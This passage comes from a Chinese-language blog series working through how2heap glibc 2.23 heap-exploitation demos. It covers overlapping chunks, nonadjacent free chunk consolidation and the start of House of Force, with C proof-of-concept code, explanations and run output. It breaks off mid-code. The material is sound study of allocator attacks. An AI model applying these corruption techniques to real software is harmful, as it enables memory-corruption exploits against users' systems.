<span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="type">char</span> *)p3);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>首先这里创建了三个堆块（p1, p2, p3），并将这三个堆块里面填满数据。接着释放中间的p2堆块，因为创建的大小为0x101，所以释放的时候会直接进入unsortedbin。然后将p2的size改为p2 + p3大小，现在堆块内只有两个chunk了，因为p3被包进了p2里面</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/13.png"></p>
<p>接下来就是创建一个size为p2 + p3的p4堆块，现在这个堆块里面还有一个存活着的p3。将p4填满数据，这个时候p3也会被覆盖</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/14.png"></p>
<p>现在填充p3可以看到p3这里还可以继续使用。这就达到了一个堆块重叠的效果p4可以改p3，p3也可以改p4。俗称overlapping。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/15.png"></p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">This is a simple chunks overlapping problem</span><br><span class="line"></span><br><span class="line">Let's start to allocate 3 chunks on the heap</span><br><span class="line">The 3 chunks have been allocated here:</span><br><span class="line">p1=0x55555555b010</span><br><span class="line">p2=0x55555555b110</span><br><span class="line">p3=0x55555555b210</span><br><span class="line"></span><br><span class="line">Now let's free the chunk p2</span><br><span class="line">The chunk p2 is now in the unsorted bin ready to serve possible</span><br><span class="line">new malloc() of its size</span><br><span class="line">Now let's simulate an overflow that can overwrite the size of the</span><br><span class="line">chunk freed p2.</span><br><span class="line">For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.</span><br><span class="line">To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.</span><br><span class="line">We are going to set the size of chunk p2 to to 385, which gives us</span><br><span class="line">a region size of 376</span><br><span class="line"></span><br><span class="line">Now let's allocate another chunk with a size equal to the data</span><br><span class="line">size of the chunk p2 injected size</span><br><span class="line">This malloc will be served from the previously freed chunk that</span><br><span class="line">is parked in the unsorted bin which size has been modified by us</span><br><span class="line"></span><br><span class="line">p4 has been allocated at 0x55555555b110 and ends at 0x55555555b288</span><br><span class="line">p3 starts at 0x55555555b210 and ends at 0x55555555b288</span><br><span class="line">p4 should overlap with p3, in this case p4 includes all p3.</span><br><span class="line"></span><br><span class="line">Now everything copied inside chunk p4 can overwrites data on</span><br><span class="line">chunk p3, and data written to chunk p3 can overwrite data</span><br><span class="line">stored in the p4 chunk.</span><br><span class="line"></span><br><span class="line">Let's run through an example. Right now, we have:</span><br><span class="line">p4 = x��</span><br><span class="line">p3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�</span><br><span class="line"></span><br><span class="line">If we memset(p4, '4', 376), we have:</span><br><span class="line">p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�</span><br><span class="line">p3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�</span><br><span class="line"></span><br><span class="line">And if we then memset(p3, '3', 80), we have:</span><br><span class="line">p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�</span><br><span class="line">p3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�</span><br></pre></td></tr></tbody></table></figure>

<h3 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Yet another simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">  </span><br><span class="line">  <span class="type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="type">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is a simple chunks overlapping problem"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's start to allocate 5 chunks on the heap:"</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">  real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">  real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">  real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">  real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n\nchunk p1 from %p to %p"</span>, p1, (<span class="type">unsigned</span> <span class="type">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p2 from %p to %p"</span>, p2,  (<span class="type">unsigned</span> <span class="type">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p3 from %p to %p"</span>, p3,  (<span class="type">unsigned</span> <span class="type">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p4 from %p to %p"</span>, p4, (<span class="type">unsigned</span> <span class="type">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p5 from %p to %p\n"</span>, p5,  (<span class="type">unsigned</span> <span class="type">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">'A'</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">'B'</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">'C'</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">'D'</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">'E'</span>,real_size_p5);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n"</span>); </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n"</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">unsigned</span> <span class="type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis operation will basically create a big free chunk that wrongly includes p3\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n"</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p6 from %p to %p"</span>, p6,  (<span class="type">unsigned</span> <span class="type">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p3 from %p to %p\n"</span>, p3, (<span class="type">unsigned</span> <span class="type">char</span> *) p3+real_size_p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nData inside chunk p3: \n\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,(<span class="type">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's write something inside p6\n"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">'F'</span>,<span class="number">1500</span>);  </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nData inside chunk p3: \n\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,(<span class="type">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>创建了5个堆块p1-p5，大小是0x3f1并将每个堆块都填满数据。释放p4再将p2的size改为p2 + p3(0x7e1)大小，现在p2和p3被一个堆给包</p>
<p>住了</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/16.png"></p>
<p>然后再释放p2可以看到p2 p3 p4都被释放掉了并形成了一个大的freed堆块，此时p3还是一个used堆块。接着创建了0x7e1大小的堆块，将p2 + p3又重新拿出来了给了p6，将p6里面填充数据可以看到p3会被覆盖，从头到尾p3者是used堆块。可以看到形成了一个overlapping</p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">This is a simple chunks overlapping problem</span><br><span class="line">This is also referenced as Nonadjacent Free Chunk Consolidation Attack</span><br><span class="line"></span><br><span class="line">Let's start to allocate 5 chunks on the heap:</span><br><span class="line"></span><br><span class="line">chunk p1 from 0x55555555b010 to 0x55555555b3f8</span><br><span class="line">chunk p2 from 0x55555555b400 to 0x55555555b7e8</span><br><span class="line">chunk p3 from 0x55555555b7f0 to 0x55555555bbd8</span><br><span class="line">chunk p4 from 0x55555555bbe0 to 0x55555555bfc8</span><br><span class="line">chunk p5 from 0x55555555bfd0 to 0x55555555c3b8</span><br><span class="line"></span><br><span class="line">Let's free the chunk p4.</span><br><span class="line">In this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4</span><br><span class="line"></span><br><span class="line">Let's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2</span><br><span class="line">with the size of chunk_p2 + size of chunk_p3</span><br><span class="line"></span><br><span class="line">Now during the free() operation on p2, the allocator is fooled to think that </span><br><span class="line">the nextchunk is p4 ( since p2 + size_p2 now point to p4 ) </span><br><span class="line"></span><br><span class="line">This operation will basically create a big free chunk that wrongly includes p3</span><br><span class="line"></span><br><span class="line">Now let's allocate a new chunk with a size that can be satisfied by the previously freed chunk</span><br><span class="line"></span><br><span class="line">Our malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and </span><br><span class="line">we can overwrite data in p3 by writing on chunk p6</span><br><span class="line"></span><br><span class="line">chunk p6 from 0x55555555b400 to 0x55555555bbd8</span><br><span class="line">chunk p3 from 0x55555555b7f0 to 0x55555555bbd8</span><br><span class="line"></span><br><span class="line">Data inside chunk p3: </span><br><span class="line"></span><br><span class="line">CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�</span><br><span class="line"></span><br><span class="line">Let's write something inside p6</span><br><span class="line"></span><br><span class="line">Data inside chunk p3: </span><br><span class="line"></span><br><span class="line">FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�</span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-force-top-chunk"><a href="#house-of-force-top-chunk" class="headerlink" title="house_of_force(top_chunk)"></a>house_of_force(top_chunk)</h3> <figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   This PoC works also with ASLR enabled.</span></span><br><span class="line"><span class="comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span></span><br><span class="line"><span class="comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span></span><br><span class="line"><span class="comment">   ( http://phrack.org/issues/66/10.html )</span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss_var[] = <span class="string">"This is a string that we want to overwrite."</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span><br><span class="line">{</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nWelcome to the House of Force\n\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The top chunk is a special chunk. Is the last in memory "</span></span><br><span class="line">		<span class="string">"and is the chunk that will be resized when malloc asks for more space from the os.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIn the end, we will use this to overwrite a variable at %p.\n"</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Its current value is: %s\n"</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's allocate the first chunk, taking space from the wilderness.\n"</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk of 256 bytes has been allocated at %p.\n"</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n"</span>);</span><br><span class="line">	<span class="type">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Real size (aligned and all that jazz) of our allocated chunk is %ld.\n"</span>, real_size + <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line">	<span class="type">intptr_t</span> *ptr_top = (<span class="type">intptr_t</span> *) ((<span class="type">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="type">long</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe top chunk starts at %p\n"</span>, ptr_top);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Old size of top chunk %#llx\n"</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">	*(<span class="type">intptr_t</span> *)((<span class="type">char</span> 